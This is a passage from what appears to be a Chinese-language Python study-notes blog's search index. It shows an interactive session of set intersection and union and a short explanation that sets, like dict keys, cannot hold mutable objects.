<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="built_in">set</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 &amp; s2</span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 | s2</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure>

<p>set和dict的唯一区别仅在于没有存储对应的value，但是，set的原理和dict一样，所以，同样不可以放入可变对象，因为无法判断两个可变对象是否相等，也就无法保证set内部“不会有重复元素”。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
</search>
